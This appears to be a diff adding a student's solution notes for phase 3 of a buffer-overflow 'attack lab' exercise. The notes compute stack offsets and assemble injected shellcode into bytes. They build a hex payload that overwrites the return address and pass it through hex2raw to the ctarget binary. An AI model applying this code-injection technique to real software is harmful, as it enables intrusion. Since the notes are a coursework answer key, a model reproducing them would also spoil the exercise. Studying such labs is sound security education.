@@ -1,0 +1,49 @@
+- total bytes before cookie: 
+buffer 0x38 (dec: 56) + 8 bytes rsp + 8 bytes touch3 = 0x48 bytes (dec: 72)
+
+- address of $rsp + 0x48 bytes = 0x5561a0d0
+
+emacs phase3.s
+    movq $0x5561a0d0,%rdi
+    retq
+
+gcc -c phase3.s
+objdump -d phase3.o  > phase3.d 
+
+emacs phase3.d:
+    phase3.o:     file format elf64-x86-64
+
+    Disassembly of section .text:
+
+    0000000000000000 <.text>:
+        0:   48 c7 c7 d0 a0 61 55    mov    $0x5561a0d0,%rdi
+        7:   c3                      retq
+
+- byte representation: 
+48 c7 c7 d0 a0 61 55 c3
+
+cookie.txt
+0x76ebdb56
+address of $rsp (phase 2):
+0x5561a088
+address of touch3:
+401932 / 40 19 32
+cookie hex-to-text converter:
+http://www.unit-conversion.info/texttools/hexadecimal/
+^ input = cookie without 0x 
+37 36 65 62 64 62 35 36
+
+phase3.txt:
+48 c7 c7 d0 a0 61 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+88 a0 61 55 00 00 00 00
+32 19 40 00 00 00 00 00
+37 36 65 62 64 62 35 36
+
+./hex2raw < phase3.txt > raw-phase3.txt
+./ctarget < raw-phase3.txt
